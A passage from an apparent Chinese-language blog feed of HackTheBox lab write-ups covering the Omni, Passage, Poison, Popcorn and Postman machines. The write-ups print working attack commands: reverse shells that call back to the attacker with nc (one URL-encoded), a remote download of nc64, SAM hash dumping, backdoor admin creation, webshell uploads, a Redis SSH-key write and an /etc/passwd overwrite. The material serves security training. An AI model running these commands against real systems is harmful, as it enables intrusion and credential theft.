<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行<code>systeminfo</code>保存到提权脚本</p>
<p><img src="/images/Optimum/7.jpg" alt="7"></p>
<p>使用MS16-098提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\10.10.16.132\a\bfill.exe</span><br><span class="line">.\bfill.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Optimum/8.jpg" alt="8"></p>
<p>另外Powershell MS16-032测试后也是可以的</p>
<p><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1</a></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Omni</title>
    <url>/2021/05/19/HTB-Omni/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Omni/1.png" alt="1"></p>
<p>8080端口需要凭据，不过提示了<code>Windows Device Portal</code></p>
<p><img src="/images/Omni/2.png" alt="2"></p>
<p>找到了一篇文章讲了<code>Windows Device Portal</code>的默认凭据:<a href="https://learn.adafruit.com/getting-started-with-windows-iot-on-raspberry-pi/prepare-raspberry-pi">链接</a></p>
<p><code>Administrator/p@ssw0rd</code>没有起到作用</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>谷歌搜索<code>port 29820</code>发现文章:<a href="chrome-extension://bocbaocobfecmglnmeaeppambideimao/pdf/viewer.html?file=https%3A%2F%2Fwww.woprsummit.org%2Fslides-archive%2FSirepRAT_RCEasSYSTEMonWindowsIoTCore-WOPRSummit.pdf">链接</a>，它描述了如何攻击<code>Sirep</code>协议，所以谷歌<code>sirep exploit</code>发现了RCE工具:<a href="https://github.com/SafeBreach-Labs/SirepRAT">链接</a></p>
<p>尝试枚举设备信息，看起来脚本因该正常工作了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$python3 SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice</span><br><span class="line">&lt;SystemInformationResult | type: 51, payload length: 32, kv: &#123;&#39;dwOSVersionInfoSize&#39;: 0, &#39;dwMajorVersion&#39;: 10, &#39;dwMinorVersion&#39;: 0, &#39;dwBuildNumber&#39;: 17763, &#39;dwPlatformId&#39;: 2, &#39;szCSDVersion&#39;: 0, &#39;wServicePackMajor&#39;: 1, &#39;wServicePackMinor&#39;: 2, &#39;wSuiteMask&#39;: 0, &#39;wProductType&#39;: 0, &#39;wReserved&#39;: 0&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>尝试执行程序<code>hostname.exe</code>，成功收到回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd &#39;C:\Windows\System32\hostname.exe&#39; --return_output --v</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/3.png" alt="3"></p>
<p>执行CMD的语法比较奇怪，而且机器上似乎没有<code>whoami</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd &#39;C:\Windows\system32\cmd.exe&#39; --args &quot;&#x2F;c ipconfig&quot; --return_output --v</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/4.png" alt="4"></p>
<p>枚举当前路径在<code>C:\windows\system32</code>，意味着普通用户不能写</p>
<p><img src="/images/Omni/5.png" alt="5"></p>
<p>拿到shell过程有些曲折，很多传输文件的方法不可用，因为对方是Windows IOT。不过<code>Invoke-WebRequest</code>工作正常，这里常规的shell.exe都不太行，所以使用nc64</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd &#39;C:\Windows\system32\cmd.exe&#39; --args &quot;&#x2F;c powershell Invoke-WebRequest -uri http:&#x2F;&#x2F;10.10.16.12&#x2F;nc64.exe -outfile C:\nc.exe&quot; --return_output --v</span><br><span class="line"></span><br><span class="line">python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd &#39;C:\Windows\system32\cmd.exe&#39; --args &quot;&#x2F;c C:\nc.exe 10.10.16.12 4444 -e powershell&quot; --return_output --v</span><br></pre></td></tr></table></figure>

<p>成功拿到shell，并通过<code>Get-Content Env:Username</code>打印出当前用户</p>
<p><img src="/images/Omni/6.png" alt="6"></p>
<p>当前账户处于SYSTEM权限</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看flag文件，都是经过加密的，详情可以参考<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml?view=powershell-7.1">链接1</a> <a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx">链接2</a></p>
<p><img src="/images/Omni/7.png" alt="7"></p>
<p>所以我们需要用户的密码来解密文件</p>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>从SAM中导出hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM C:\SYSTEM</span><br><span class="line">reg save HKLM\SAM C:\SAM</span><br></pre></td></tr></table></figure>

<p>文件传输过来，本地开启SMB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbserver.py -smb2support share . -username root -password toor</span><br></pre></td></tr></table></figure>

<p>建立IPC$，之后复制过来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\10.10.16.12\share &#x2F;u:root toor</span><br><span class="line">copy C:\SAM \\10.10.16.12\share\</span><br><span class="line">copy C:\SYSTEM \\10.10.16.12\share\</span><br></pre></td></tr></table></figure>

<p>secretsdump即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam SAM -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/9.png" alt="9"></p>
<p>用户app的密码可以破解，得到<code>mesh5143</code></p>
<p><img src="/images/Omni/8.png" alt="8"></p>
<p>或者远程导也可以，这需要从对方机器445端口建立反向隧道。kali运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chisel server --reverse --port 4000 </span><br></pre></td></tr></table></figure>

<p>受害者运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\chisel client 10.10.16.12:4000 R:445:127.0.0.1:445</span><br></pre></td></tr></table></figure>

<p>之后在受害者上建立个管理员账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user superadmin password123 &#x2F;add net localgroup administrators &#x2F;add superadmin</span><br></pre></td></tr></table></figure>

<p>之后在kali上运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py &#39;superadmin:password123@127.0.0.1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/10.png" alt="10"></p>
<p>使用凭据<code>app/mesh5143</code>可以登陆之前的8080端口</p>
<p><img src="/images/Omni/11.png" alt="11"></p>
<p>它用友run command功能</p>
<p><img src="/images/Omni/12.png" alt="12"></p>
<p>反弹到本地，之后就可以解密之前的user.txt了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Import-CliXml -Path user.txt).GetNetworkCredential().Password</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/13.png" alt="13"></p>
<h2 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h2><p>在User.txt目录下还有个加密的文件iot-admin.xml，我们也可以解密它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Import-CliXml -Path iot-admin.xml).GetNetworkCredential() | fl *</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/14.png" alt="14"></p>
<p>使用凭据<code>administrator/_1nt3rn37ofTh1nGz</code>可以登陆8080端口，然后和user一样故技重施即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(Import-CliXml -Path root.txt).GetNetworkCredential().password</span><br></pre></td></tr></table></figure>

<p><img src="/images/Omni/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Passage</title>
    <url>/2020/09/08/HTB-Passage/</url>
    <content><![CDATA[<h1 id="Passage"><a href="#Passage" class="headerlink" title="Passage"></a>Passage</h1><p>本周HTB更新的靶机，尝一波鲜</p>
<p>难度为medium</p>
<p><img src="/images/Passage/1.jpg" alt="1"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Passage/2.jpg" alt="2"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口发现了CuteNews CMS</p>
<p><img src="/images/Passage/3.jpg" alt="3"></p>
<p>接着尝试目录枚举，这里枚举3个后被封ip，看来存在waf<br>那只能进行爬虫，但没有发现有趣的信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>对CuteNewsCMS开始攻击</p>
<p><img src="/images/Passage/4.jpg" alt="4"></p>
<p>由于不知道版本号，按照习惯从高版本漏洞开始测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CuteNews 2.1.2 - &#39;avatar&#39; Remote Code Execution (Metasploit)                                        | php&#x2F;remote&#x2F;46698.rb</span><br><span class="line">CuteNews 2.1.2 - Arbitrary File Deletion                                                            | php&#x2F;webapps&#x2F;48447.txt</span><br><span class="line">CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                | php&#x2F;webapps&#x2F;48458.txt</span><br></pre></td></tr></table></figure>

<p>这里48458.txt和46698.rb都是文件上传，但是细节部分有一些小区别</p>
<p>我们先尝试46698.rb，阅读可以发现它的攻击流程如下</p>
<ol>
<li>用户登录</li>
<li>在修改用户头像处，制作shell并上传，上传过程中有一些绕过操作</li>
<li>webshell路径可以直接获得</li>
</ol>
<p>这个攻击方式看来很高效且简单，我们不需要知道后台管理员的登录凭据，因为是通过头像处上传，我们直接注册一个自己的账号就可以了</p>
<p>按照流程，我们注册账号<code>hackerars/hackerars1337</code>并登录<br>制作shell并上传，bypass方式如下</p>
<p><img src="/images/Passage/5.jpg" alt="5"></p>
<p>修改文件名<br>添加GIF头部</p>
<p><img src="/images/Passage/6.jpg" alt="6"></p>
<p>这样我们的shell就上传成功，并且头像处直接给出了路径</p>
<p><img src="/images/Passage/7.jpg" alt="7"></p>
<p>这样就可以通过webshell获取intial shell了</p>
<p><img src="/images/Passage/8.jpg" alt="8"></p>
<h3 id="方法2-metasploit"><a href="#方法2-metasploit" class="headerlink" title="方法2 metasploit"></a>方法2 metasploit</h3><p>手动既然可以，那么metasploit应该也是可以的<br>导入模块，这里这个模块有一个很简单的问题需要fixing，谷歌即可</p>
<p><img src="/images/Passage/9.jpg" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas.sh扫描，没有发现可以直接获取root的利用<br>在/etc/passwd中发现了其他用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nadav:x:1000:1000:Nadav,,,:&#x2F;home&#x2F;nadav:&#x2F;bin&#x2F;bash</span><br><span class="line">paul:x:1001:1001:Paul Coles,,,:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>看来不能一步到位</p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>思路很明确，既然我们是从web自己注册的账户过来的，那么web中八成有管理员账户并存在凭据<br>搜索发现cutenews不依赖数据库存储，可以部署在任何web环境中，我们就去寻找潜在凭据</p>
<p>这一步消耗了比较长的时间，因为我知道正确的位置，但这里hash有点多，找了一会儿还以为方向错了<br>最终发现hash在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;CuteNews&#x2F;cdata&#x2F;users&#x2F;b0.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Passage/10.jpg" alt="10"></p>
<p>base64解码</p>
<p><img src="/images/Passage/11.jpg" alt="11"></p>
<p>发现了一段序列化数据，并存在一段sha256的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --format&#x3D;raw-sha256 hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Passage/12.jpg" alt="12"></p>
<p>成功破解了凭据<code>atlanta1</code></p>
<p><img src="/images/Passage/13.jpg" alt="13"></p>
<h4 id="确认提权思路"><a href="#确认提权思路" class="headerlink" title="确认提权思路"></a>确认提权思路</h4><p>在检查提权的过程中有所发现</p>
<p><img src="/images/Passage/20.jpg" alt="20"></p>
<p>寻找所有可执行文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;home -type f -perm -111</span><br></pre></td></tr></table></figure>

<p>发现了gdbus</p>
<p><img src="/images/Passage/21.jpg" alt="21"></p>
<p>并寻找到了一篇关于gdbus提权的文章<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">链接</a></p>
<p><img src="/images/Passage/22.jpg" alt="22"></p>
<p>它需要一个sudo组的成员用户，并可以绕过密码验证，以root身份完成完成任意文件写入，从而达到提权<br>当前用户paul不属于sudo组，我们需要下一个猎物</p>
<p><img src="/images/Passage/23.jpg" alt="23"></p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>这一步需要不断的枚举，linpeas能让你有效避免一些坑，但是不能给你正确的方法</p>
<p>我们在用户主目录里发现了有趣的信息</p>
<p><img src="/images/Passage/14.jpg" alt="14"></p>
<p>确认/etc/ssh/sshd_config</p>
<p><img src="/images/Passage/16.jpg" alt="16"></p>
<p>直接私钥切换用户即可</p>
<p><img src="/images/Passage/15.jpg" alt="15"></p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>这个漏洞可以起到绕过权限限制的作用，因为当前用户属于sudo组，但我们并不知道密码是什么，不过确实调用了root权限</p>
<p><img src="/images/Passage/17.jpg" alt="17"></p>
<p>修改passwd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator --method com.ubuntu.USBCreator.Image &#x2F;tmp&#x2F;passwd &#x2F;etc&#x2F;passwd true</span><br></pre></td></tr></table></figure>

<p><img src="/images/Passage/19.jpg" alt="19"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Poison</title>
    <url>/2020/06/25/HTB-Poison/</url>
    <content><![CDATA[<h1 id="Poison"><a href="#Poison" class="headerlink" title="Poison"></a>Poison</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/poison/1.jpg" alt="1"></p>
<p>发现了22和80两个端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80页面如下</p>
<p><img src="/images/poison/2.jpg" alt="2"></p>
<p>看提示应该是1个本地文件包含</p>
<p><img src="/images/poison/3.jpg" alt="3"></p>
<p>发现的确存在本地文件包含<br>再尝试页面提示的文件看看</p>
<p><img src="/images/poison/4.jpg" alt="4"></p>
<p>在listfiles.php里发现了提示，pwdbackup.txt，尝试包含</p>
<p><img src="/images/poison/5.jpg" alt="5"></p>
<p>页面经过base64编码，而且提示编码了13次</p>
<p>解密之后就可以得到密码<code>Charix!2#4%6&amp;8(0</code><br>这样就可以登录ssh</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>我们可以使用另一种方法进行渗透<br>可以尝试使用<code>php://</code>进行截断，读取网页源码，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/6.jpg" alt="6"></p>
<p>再进行解码即可</p>
<p><img src="/images/poison/7.jpg" alt="7"></p>
<p>不过似乎没啥大的发现</p>
<h3 id="phpinfo-race-condition-Getshell"><a href="#phpinfo-race-condition-Getshell" class="headerlink" title="phpinfo+race condition Getshell"></a>phpinfo+race condition Getshell</h3><p>漏洞说明:<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a><br>漏洞exp:<a href="https://raw.githubusercontent.com/vulhub/vulhub/master/php/inclusion/exp.py">https://raw.githubusercontent.com/vulhub/vulhub/master/php/inclusion/exp.py</a></p>
<p>受限观察phpinfo信息，可以发现</p>
<p><img src="/images/poison/8.jpg" alt="8"></p>
<p>无法使用RFI，但是可以文件上传</p>
<p>尝试使用文件上传，构造HTTP包</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/phpinfo.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.10.10.84</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=--EOF</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"></span><br><span class="line">----EOF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: from-data; name=&quot;test&quot;; filename=&quot;eviltest&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">this is simple test</span><br><span class="line">----EOF</span><br></pre></td></tr></table></figure>

<p>发现文件成功上传</p>
<p><img src="/images/poison/9.jpg" alt="9"></p>
<p>再次刷新，发现缓存已经没了，可以确认存在竞争关系</p>
<p><img src="/images/poison/10.jpg" alt="10"></p>
<p>修改exp的文件包含，改成如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LFIREQ&#x3D;&quot;&quot;&quot;GET &#x2F;browse.php?file&#x3D;%s HTTP&#x2F;1.1\r</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/11.jpg" alt="11"></p>
<p>成功写入了木马<br>可以RCE</p>
<p><img src="/images/poison/12.jpg" alt="12"></p>
<p>反弹shell，对payload进行url编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%39%39%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/13.jpg" alt="13"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在主目录下发现了secret.zip</p>
<p><img src="/images/poison/16.jpg" alt="16"></p>
<p>传送过来进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp charix@10.10.10.84:&#x2F;home&#x2F;charix&#x2F;secret.zip &#x2F;root&#x2F;Desktop&#x2F;secret.zip</span><br><span class="line">Charix!2#4%6&amp;8(0</span><br></pre></td></tr></table></figure>

<p>解压密码就是Charix!2#4%6&amp;8(0，解压完成后发现一些乱码</p>
<p>发现root正在运行VNC</p>
<p><img src="/images/poison/14.jpg" alt="14"></p>
<p>不过vnc在监听本地端口</p>
<p><img src="/images/poison/15.jpg" alt="15"></p>
<p>利用ssh隧道转发出去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -N -L 9999:127.0.0.1:5901 charix@10.10.10.84</span><br><span class="line">Charix!2#4%6&amp;8(0</span><br></pre></td></tr></table></figure>

<p>再访问本地隧道开口9999</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncviewer 127.0.0.1::9999 -passwd &#x2F;root&#x2F;Desktop&#x2F;secret</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/17.jpg" alt="17"></p>
<p>成功获取root会话</p>
<p>之后用passwd给root改个密码，ssh过去，就不用vnc了</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Popcorn</title>
    <url>/2020/10/19/HTB-Popcorn/</url>
    <content><![CDATA[<h1 id="Popcorn"><a href="#Popcorn" class="headerlink" title="Popcorn"></a>Popcorn</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Popcorn/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Popcorn/2.png" alt="2"></p>
<p>发现了test.php为phpinfo，但是没有得到太多信息</p>
<p><img src="/images/Popcorn/4.png" alt="4"></p>
<p>发现了<code>Torrent Hoster</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索漏洞</p>
<p><img src="/images/Popcorn/3.png" alt="3"></p>
<p>是一个文件上传，但是路径不对</p>
<p>尝试手动挖掘</p>
<p>尝试搜索默认登录凭据和常见弱口令，失败。不过页面提供了注册功能</p>
<p>找到了一处上传点</p>
<p><img src="/images/Popcorn/5.png" alt="5"></p>
<p>不过好像无法绕过</p>
<p><img src="/images/Popcorn/6.png" alt="6"></p>
<p>所以选择乖乖上传一个torrent文件，看看后续。直接上传收藏多年的torrent过去</p>
<p>之后又会发现一个上传点，看似是修改torrent的图标的，理论上如果上传成功，可以直接得到上传路径</p>
<p><img src="/images/Popcorn/7.png" alt="7"></p>
<p>尝试上传webshell</p>
<p><img src="/images/Popcorn/8.png" alt="8"></p>
<p>成功，之后果然找到了路径</p>
<p><img src="/images/Popcorn/9.png" alt="9"></p>
<p>查看</p>
<p><img src="/images/Popcorn/10.png" alt="10"></p>
<p>获取shell</p>
<p><img src="/images/Popcorn/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Popcorn/12.png" alt="12"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ubuntu 9.10</span><br><span class="line">2.6.31-14-generic-pae</span><br></pre></td></tr></table></figure>

<p><img src="/images/Popcorn/13.png" alt="13"></p>
<p>发现linux PAM提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l |grep pam</span><br></pre></td></tr></table></figure>

<p>尝试使用14339.sh进行提权</p>
<p>直接运行会报错<code>No such file or directory</code></p>
<p><img src="/images/Popcorn/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi 14339.sh</span><br><span class="line">:set ff</span><br><span class="line">:set ff&#x3D;unix</span><br><span class="line">:wq!</span><br></pre></td></tr></table></figure>

<p>就能获得root</p>
<p><img src="/images/Popcorn/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Postman</title>
    <url>/2020/10/28/HTB-Postman/</url>
    <content><![CDATA[<h1 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Postman/1.png" alt="1"></p>
<p>发现了redis</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>10000端口发现https，添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.160	postman.htb postman</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/2.png" alt="2"></p>
<p>登陆页面</p>
<p><img src="/images/Postman/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现对方redis版本为4.0.9，在4.0~5.0之间的版本可能会受到未授权访问造成的RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install redis-tools</span><br></pre></td></tr></table></figure>

<p>尝试连接redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160</span><br></pre></td></tr></table></figure>

<p>连接成功，<code>info</code>命令给出了redis的一些信息</p>
<p><img src="/images/Postman/4.png" alt="4"></p>
<p>所以这是一个redis未授权访问</p>
<p>可以找到一篇文章描述了攻击redis的多种方式：<a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p>
<p>先生成rsa密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p>修改一下公钥的格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br></pre></td></tr></table></figure>

<p>将这个公钥文件导入redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/5.png" alt="5"></p>
<p>之后写入的时候需要修改一下，随便写一个位置会没有权限</p>
<p><img src="/images/Postman/6.png" alt="6"></p>
<p>需要找到redis的目录，谷歌可以找到</p>
<p><img src="/images/Postman/7.png" alt="7"></p>
<p>所以需要修改一下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/8.png" alt="8"></p>
<p>这个.ssh目录本身就是存在的，如果随便输一个目录会得到</p>
<p><img src="/images/Postman/9.png" alt="9"></p>
<p>之后就可以ssh连接</p>
<p><img src="/images/Postman/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先发现了用户</p>
<p><img src="/images/Postman/11.png" alt="11"></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>这里有些难受，由于80和10000的web端口没有使用过，老想去web目录寻找到一些凭据，但是啥都没有，或者权限不足</p>
<p>最后在linpeas发现，我晕，怎么不换一行显示</p>
<p><img src="/images/Postman/12.png" alt="12"></p>
<p>得到一个ssh私钥文件</p>
<p><img src="/images/Postman/13.png" alt="13"></p>
<p>可以使用john进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py key &gt;hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/14.png" alt="14"></p>
<p>改密码可以切换到Matt</p>
<p><img src="/images/Postman/15.png" alt="15"></p>
<p>这里不能ssh，因为<code>/etc/ssh/sshd_config</code></p>
<p><img src="/images/Postman/16.png" alt="16"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><img src="/images/Postman/17.png" alt="17"></p>
<p>root疑似在运行webmin</p>
<p>回到10000端口，matt的凭据能够登录</p>
<p><img src="/images/Postman/18.png" alt="18"></p>
<p>不过该web目录不可以写，应该不能写个shell之类的</p>
<p><img src="/images/Postman/19.png" alt="19"></p>
<p>搜索公开漏洞有很多</p>
<p><img src="/images/Postman/20.png" alt="20"></p>
<p>现在应该去定位版本</p>
<p><img src="/images/Postman/21.png" alt="21"></p>
<p>1.90有一个msf可以用，别忘了SSL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce </span><br><span class="line">set LhOST tun0</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set UserNAME Matt</span><br><span class="line">set PasSWORD computer2008</span><br><span class="line">set SSL true</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/22.png" alt="22"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Holiday</title>
